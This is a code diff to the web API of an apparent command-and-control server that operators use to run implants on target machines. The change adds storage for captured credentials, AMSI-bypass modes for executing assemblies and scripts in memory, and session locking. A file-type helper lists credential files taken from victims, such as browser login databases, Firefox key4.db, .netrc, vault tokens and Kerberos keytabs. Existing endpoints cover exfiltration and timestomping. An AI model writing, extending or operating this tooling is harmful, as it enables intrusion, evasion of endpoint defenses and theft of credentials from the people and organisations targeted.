@@ -21,6 +21,10 @@ POST   /api/v1/sessions/{id}/timestomp          — timestomp a file
 POST   /api/v1/sessions/{id}/upload             — stage file on cloud for agent pull
 POST   /api/v1/sessions/{id}/download           — exfil file from target via staging
 GET    /api/v1/sessions/{id}/artifacts          — tracked artifact registry
+GET    /api/v1/sessions/{id}/credentials        — list captured credentials
+POST   /api/v1/sessions/{id}/credentials        — add a credential
+PUT    /api/v1/sessions/{id}/credentials/{cid}  — update a credential
+DELETE /api/v1/sessions/{id}/credentials/{cid}  — delete a credential
 GET    /api/v1/sessions/{id}/staging            — list files in cloud staging path
 GET    /api/v1/sessions/{id}/staging/{fname}    — proxy-download a staged file
 """
@@ -47,6 +51,8 @@ from server.models import (
     ArtifactEntry,
     CommandRequest,
     CommandResponse,
+    CredentialEntry,
+    CredentialRequest,
     DownloadedFile,
     HistoryEntry,
     JitterRequest,
@@ -130,6 +136,13 @@ def _require_session(sm, session_id):
     return s
 
 
+def _require_unlocked(sm, session_id):
+    s = _require_session(sm, session_id)
+    if getattr(s.profile, 'locked', False):
+        raise HTTPException(status_code=423, detail="Session is locked")
+    return s
+
+
 # ── CRUD ──────────────────────────────────────────────────────────────────────
 
 @router.get("", response_model=List[SessionSummary])
@@ -150,12 +163,28 @@ def get_session(session_id: str, request: Request,
 async def remove_session(session_id: str, request: Request,
                          username: str = Depends(get_current_user)):
     sm = _sm(request)
+    _require_unlocked(sm, session_id)
     if not await sm.remove(session_id):
         raise HTTPException(status_code=404, detail="Session not found")
     await request.app.state.ws.broadcast({
         "type": "session.removed",
         "payload": {"id": session_id, "session_id": session_id, "removed_by": username},
     })
+
+
+@router.post("/{session_id}/lock", status_code=status.HTTP_200_OK)
+async def toggle_lock(session_id: str, request: Request,
+                      username: str = Depends(get_current_user)):
+    sm = _sm(request)
+    s = _require_session(sm, session_id)
+    new_val = not getattr(s.profile, 'locked', False)
+    s.profile.locked = new_val
+    sm.save_session(session_id)
+    await request.app.state.ws.broadcast({
+        "type": "session.locked",
+        "payload": {"session_id": session_id, "locked": new_val, "by": username},
+    })
+    return {"locked": new_val}
 
 
 class WipeRequest(BaseModel):
@@ -171,6 +200,7 @@ async def wipe_session(session_id: str, body: WipeRequest, request: Request,
     Full teardown streamed as SSE events so the browser can show per-step progress.
     Steps: kill → remove → session_json → deploy_dir → uploads → history → done
     """
+    _require_unlocked(_sm(request), session_id)
     import asyncio, shutil, json as _json_mod
 
     sm  = _sm(request)
@@ -201,6 +231,7 @@ async def wipe_session(session_id: str, body: WipeRequest, request: Request,
         _wipe_label = (
             snap.get("target_host")
             or snap.get("hostname")
+            or profile.label
             or (profile.folder_path.split("/")[-1] if profile.folder_path else None)
             or session_id
         )
@@ -266,15 +297,16 @@ async def wipe_session(session_id: str, body: WipeRequest, request: Request,
         else:
             yield _evt("deploy_dir", "skip", "Deployment directory preserved")
 
-        # ── 5. Upload records ──────────────────────────────────────────────────
+        # ── 5. Upload records + credential records ────────────────────────────
         log_dir = Path(cfg.log_dir)
         deleted_ul = []
-        for f in log_dir.glob(f"uploads_{session_id}.json"):
-            try:
-                f.unlink()
-                deleted_ul.append(f.name)
-            except Exception:
-                pass
+        for pattern in [f"uploads_{session_id}.json", f"credentials_{session_id}.json"]:
+            for f in log_dir.glob(pattern):
+                try:
+                    f.unlink()
+                    deleted_ul.append(f.name)
+                except Exception:
+                    pass
         if deleted_ul:
             yield _evt("uploads", "ok", "", files=deleted_ul)
         else:
@@ -366,10 +398,15 @@ async def wipe_session(session_id: str, body: WipeRequest, request: Request,
 
 # ── command dispatch ──────────────────────────────────────────────────────────
 
+_DESTRUCTIVE_COMMANDS = {"KILL", "EXIT", "STOP"}
+
 @router.post("/{session_id}/command", response_model=CommandResponse)
 async def send_command(session_id: str, body: CommandRequest, request: Request,
                        username: str = Depends(get_current_user)):
-    _require_session(_sm(request), session_id)
+    sm = _sm(request)
+    s = _require_session(sm, session_id)
+    if body.command in _DESTRUCTIVE_COMMANDS and getattr(s.profile, 'locked', False):
+        raise HTTPException(status_code=423, detail="Session is locked")
     return await _send(request, session_id, body.command, username, display=body.display)
 
 
@@ -419,7 +456,7 @@ async def set_jitter(session_id: str, body: JitterRequest, request: Request,
 @router.post("/{session_id}/kill", response_model=CommandResponse)
 async def kill_session(session_id: str, request: Request,
                        username: str = Depends(get_current_user)):
-    _require_session(_sm(request), session_id)
+    _require_unlocked(_sm(request), session_id)
     return await _send(request, session_id, "KILL", username, display="/kill")
 
 
@@ -560,8 +597,8 @@ async def exec_inline(session_id: str, request: Request,
     s   = _require_session(sm, session_id)
     cfg = request.app.state.cfg
 
-    if exec_type not in ("bof", "assembly", "memexec"):
-        raise HTTPException(status_code=422, detail="exec_type must be 'bof', 'assembly', or 'memexec'")
+    if exec_type not in ("bof", "assembly", "assembly-amsibypass", "memexec", "script", "script-amsibypass"):
+        raise HTTPException(status_code=422, detail="exec_type must be 'bof', 'assembly', 'assembly-amsibypass', 'memexec', 'script', or 'script-amsibypass'")
 
     max_bytes = cfg.settings.max_upload_mb * 1024 * 1024
     data = await file.read(max_bytes + 1)
@@ -581,8 +618,8 @@ async def exec_inline(session_id: str, request: Request,
     if not ok:
         raise HTTPException(status_code=502, detail="Cloud upload failed")
 
-    cmd_map = {"bof": f"BOF_EXEC:{staging}:{args}", "assembly": f"ASSEMBLY_EXEC:{staging}:{args}", "memexec": f"MEMEXEC:{staging}:{args}"}
-    disp_map = {"bof": f"/bof {safe_name} {args}".strip(), "assembly": f"/assembly {safe_name} {args}".strip(), "memexec": f"/memexec {safe_name} {args}".strip()}
+    cmd_map = {"bof": f"BOF_EXEC:{staging}:{args}", "assembly": f"ASSEMBLY_EXEC:{staging}:{args}", "assembly-amsibypass": f"ASSEMBLY_EXEC_AB:{staging}:{args}", "memexec": f"MEMEXEC:{staging}:{args}", "script": f"SCRIPT_EXEC:{staging}:{args}", "script-amsibypass": f"SCRIPT_EXEC_AB:{staging}:{args}"}
+    disp_map = {"bof": f"/bof {safe_name} {args}".strip(), "assembly": f"/assembly {safe_name} {args}".strip(), "assembly-amsibypass": f"/assembly-amsibypass {safe_name} {args}".strip(), "memexec": f"/memexec {safe_name} {args}".strip(), "script": f"/script {safe_name} {args}".strip(), "script-amsibypass": f"/script-amsibypass {safe_name} {args}".strip()}
     result = await _send(request, session_id, cmd_map[exec_type], username, display=disp_map[exec_type])
     return {"cloud_path": staging, "exec_type": exec_type, "command": result}
 
@@ -662,6 +699,99 @@ def get_artifacts(session_id: str, request: Request,
 # ── downloaded files (files saved via /download on the operator machine) ─────
 
 _SAVED_RE = _re.compile(r'^saved:\s+(.+?)\s+\(\s*([0-9,]+)\s+bytes\)')
+
+
+def _detect_mime(local_path: str) -> str | None:
+    """Determine MIME type from extension, then magic bytes, then filename patterns."""
+    mime, _ = _mt.guess_type(local_path)
+    if mime:
+        return mime
+
+    p = Path(local_path)
+    name_lower = p.name.lower()
+
+    _NAME_PATTERNS = {
+        "login data":       "application/x-sqlite3",
+        "cookies":          "application/x-sqlite3",
+        "plum.sqlite":      "application/x-sqlite3",
+        "web.config":       "application/xml",
+        "key4.db":          "application/x-sqlite3",
+        "cert9.db":         "application/x-sqlite3",
+        "logins.json":      "application/json",
+        "local state":      "application/json",
+        "known_hosts":      "text/plain",
+        "authorized_keys":  "text/plain",
+        "ultravnc.ini":     "text/plain",
+        "winscp.ini":       "text/plain",
+        "confcons.xml":     "application/xml",
+        "credentials.xml":  "application/xml",
+        ".pgpass":          "text/plain",
+        ".my.cnf":          "text/plain",
+        ".netrc":           "text/plain",
+        ".npmrc":           "text/plain",
+        ".pypirc":          "text/plain",
+        ".yarnrc":          "text/plain",
+        ".env":             "text/plain",
+        ".vault-token":     "text/plain",
+        "wp-config.php":    "text/x-php",
+        "auth.json":        "application/json",
+    }
+    for pattern, m in _NAME_PATTERNS.items():
+        if pattern in name_lower:
+            return m
+
+    _EXT_MAP = {
+        ".xml": "application/xml", ".json": "application/json",
+        ".ini": "text/plain",      ".conf": "text/plain",
+        ".cfg": "text/plain",      ".config": "application/xml",
+        ".pem": "application/x-pem-file",
+        ".key": "application/x-pem-file",
+        ".crt": "application/x-x509-ca-cert",
+        ".db":  "application/x-sqlite3",
+        ".sqlite": "application/x-sqlite3",
+        ".sqlite3": "application/x-sqlite3",
+        ".tfstate": "application/json",
+        ".service": "text/plain",
+        ".keytab":  "application/octet-stream",
+        ".rdp":     "text/plain",
+        ".ps1":     "text/plain",
+        ".bat":     "text/plain",
+        ".sh":      "text/x-shellscript",
+    }
+    suffix = p.suffix.lower()
+    if suffix in _EXT_MAP:
+        return _EXT_MAP[suffix]
+
+    try:
+        with open(local_path, "rb") as fh:
+            head = fh.read(16)
+        if not head:
+            return None
+        if head[:6] == b"SQLite":
+            return "application/x-sqlite3"
+        if head[:4] == b"\x89PNG":
+            return "image/png"
+        if head[:2] in (b"\xff\xd8",):
+            return "image/jpeg"
+        if head[:4] == b"%PDF":
+            return "application/pdf"
+        if head[:4] == b"PK\x03\x04":
+            return "application/zip"
+        if head[:3] == b"\x1f\x8b\x08":
+            return "application/gzip"
+        if head[:2] == b"\x05\x04":
+            return "application/x-krb5-ccache"
+        if head[:2] == b"\x05\x02":
+            return "application/x-krb5-keytab"
+        try:
+            head.decode("utf-8")
+            return "text/plain"
+        except UnicodeDecodeError:
+            return "application/octet-stream"
+    except OSError:
+        return None
+
+
 _DL_ROOT  = Path("downloads").resolve()
 
 
@@ -717,7 +847,7 @@ def list_downloads(session_id: str, request: Request,
                     # cmd is stored as "/download <remote_path>"
                     remote_path = cmd.removeprefix("/download").strip() or None
                     p = Path(local_path)
-                    mime_type, _ = _mt.guess_type(local_path)
+                    mime_type = _detect_mime(local_path)
                     entries.append(DownloadedFile(
                         filename     = p.name,
                         local_path   = local_path,
@@ -809,6 +939,112 @@ async def toggle_upload_status(session_id: str, request: Request,
         pass
     await request.app.state.ws.broadcast({
         "type": "session.artifacts.changed",
+        "ts": _tz.now().isoformat(),
+        "payload": {"session_id": session_id},
+    })
+
+
+# ── captured credentials ──────────────────────────────────────────────────────
+
+def _creds_path(session) -> Path:
+    return session.hist._log_dir / f"credentials_{session.id}.json"
+
+
+def _load_creds(session) -> list[dict]:
+    p = _creds_path(session)
+    if not p.exists():
+        return []
+    try:
+        return _json.loads(p.read_text())
+    except Exception:
+        return []
+
+
+def _save_creds(session, creds: list[dict]) -> None:
+    _creds_path(session).write_text(_json.dumps(creds, indent=2))
+
+
+@router.get("/{session_id}/credentials", response_model=List[CredentialEntry])
+def list_credentials(session_id: str, request: Request,
+                     username: str = Depends(get_current_user)):
+    s = _require_session(_sm(request), session_id)
+    return _load_creds(s)
+
+
+@router.post("/{session_id}/credentials", response_model=CredentialEntry,
+             status_code=status.HTTP_201_CREATED)
+async def add_credential(session_id: str, body: CredentialRequest,
+                         request: Request,
+                         username: str = Depends(get_current_user)):
+    s = _require_session(_sm(request), session_id)
+    creds = _load_creds(s)
+    import uuid
+    entry = {
+        "id": uuid.uuid4().hex[:12],
+        "timestamp": _tz.now().isoformat(),
+        "session_id": session_id,
+        "source": body.source,
+        "username": body.username,
+        "secret": body.secret,
+        "secret_type": body.secret_type,
+        "domain": body.domain,
+        "protocol": body.protocol,
+        "host": body.host,
+        "port": body.port,
+        "notes": body.notes,
+        "operator": username,
+    }
+    creds.append(entry)
+    _save_creds(s, creds)
+    await request.app.state.ws.broadcast({
+        "type": "session.credentials.changed",
+        "ts": _tz.now().isoformat(),
+        "payload": {"session_id": session_id},
+    })
+    return entry
+
+
+@router.put("/{session_id}/credentials/{cred_id}", response_model=CredentialEntry)
+async def update_credential(session_id: str, cred_id: str,
+                            body: CredentialRequest, request: Request,
+                            username: str = Depends(get_current_user)):
+    s = _require_session(_sm(request), session_id)
+    creds = _load_creds(s)
+    for c in creds:
+        if c.get("id") == cred_id:
+            c["username"] = body.username
+            c["secret"] = body.secret
+            c["secret_type"] = body.secret_type
+            c["source"] = body.source
+            c["domain"] = body.domain
+            c["protocol"] = body.protocol
+            c["host"] = body.host
+            c["port"] = body.port
+            c["notes"] = body.notes
+            _save_creds(s, creds)
+            await request.app.state.ws.broadcast({
+                "type": "session.credentials.changed",
+                "ts": _tz.now().isoformat(),
+                "payload": {"session_id": session_id},
+            })
+            return c
+    raise HTTPException(status_code=404, detail="Credential not found")
+
+
+@router.delete("/{session_id}/credentials/{cred_id}",
+               status_code=status.HTTP_204_NO_CONTENT)
+async def delete_credential(session_id: str, cred_id: str,
+                            request: Request,
+                            username: str = Depends(get_current_user)):
+    s = _require_session(_sm(request), session_id)
+    creds = _load_creds(s)
+    before = len(creds)
+    creds = [c for c in creds if c.get("id") != cred_id]
+    if len(creds) == before:
+        raise HTTPException(status_code=404, detail="Credential not found")
+    _save_creds(s, creds)
+    await request.app.state.ws.broadcast({
+        "type": "session.credentials.changed",
         "ts": _tz.now().isoformat(),
         "payload": {"session_id": session_id},
     })
